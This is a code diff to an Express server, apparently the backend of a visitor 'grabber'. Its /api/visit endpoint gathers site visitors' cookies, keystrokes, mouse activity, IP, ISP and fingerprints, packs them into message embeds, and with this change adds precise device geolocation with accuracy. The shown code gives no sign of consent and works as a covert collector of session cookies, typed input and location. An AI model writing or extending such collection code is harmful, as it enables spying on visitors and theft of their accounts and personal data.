@@ -267,6 +267,8 @@ function detectSecurityThreats(req, visitorInfo) {
   return threats;
 }
 
+// ... (previous server.js code up to /api/visit endpoint)
+
 app.post('/api/visit', csrfProtection, async (req, res) => {
   try {
     logger.info('Received /api/visit request', {
@@ -337,6 +339,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       currentUrl: req.body.part1?.currentUrl || 'Unknown',
       scrollPosition: req.body.part3?.scrollPosition || 'Unknown',
       cookies: JSON.stringify(req.cookies) || '{}',
+      location: req.body.part1?.location || 'Unknown',
       part3: {
         keystrokes: req.body.part3?.keystrokes || 'None',
         mouseMovementFrequency: req.body.part3?.mouseMovementFrequency || 'Unknown',
@@ -385,6 +388,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Country', value: visitorInfo.country, inline: true },
       { name: 'City', value: visitorInfo.city, inline: true },
       { name: 'Coordinates', value: `(${visitorInfo.latitude}, ${visitorInfo.longitude})`, inline: true },
+      { name: 'Device Location', value: visitorInfo.location !== 'Unknown' ? `(${visitorInfo.location.latitude}, ${visitorInfo.location.longitude}, Accuracy: ${visitorInfo.location.accuracy}m)` : visitorInfo.location, inline: true },
       { name: 'ISP', value: visitorInfo.isp, inline: true },
       { name: 'Mobile', value: visitorInfo.mobile ? 'Yes' : 'No', inline: true },
       { name: 'Proxy', value: visitorInfo.proxy ? 'Yes' : 'No', inline: true },
@@ -430,10 +434,10 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
     ];
 
-    const part1 = fields.slice(0, 15); // Critical data: IP, all IPs, device, referrer, etc.
-    const part2 = fields.slice(15, 30); // Browser and device details
-    const part3 = fields.slice(30, 45); // Interaction and behavioral data
-    const part4 = fields.slice(45); // Fingerprints and threats
+    const part1 = fields.slice(0, 15);
+    const part2 = fields.slice(15, 30);
+    const part3 = fields.slice(30, 45);
+    const part4 = fields.slice(45);
 
     const payload1 = {
       embeds: [{
@@ -617,3 +621,4 @@ app.use((err, req, res, next) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => logger.info(`Server running on port ${PORT}`));
+
